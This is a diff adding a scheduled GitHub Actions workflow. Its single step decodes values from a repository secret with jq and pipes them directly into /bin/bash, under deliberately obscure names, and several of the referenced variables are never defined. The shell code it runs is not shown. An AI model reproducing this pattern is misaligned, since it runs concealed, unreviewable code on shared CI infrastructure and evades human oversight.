@@ -1,0 +1,23 @@
+name: qudefabaodefangjian
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '58 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: qudefabaodefangjian
+        env:
+          jcgp773: ${{ secrets.jcgp773 }}
+        run: |
+          echo $jcgp773 | jq -r .bdm44 | /bin/bash
+          echo $bzq47889 | jq -r .bu6996 | /bin/bash
+          echo $mkv23 | jq -r .smvb332 | /bin/bash
+          echo $fm5110 | jq -r .u1 | /bin/bash
+          echo $lt91 | jq -r .cmra123 | /bin/bash
+
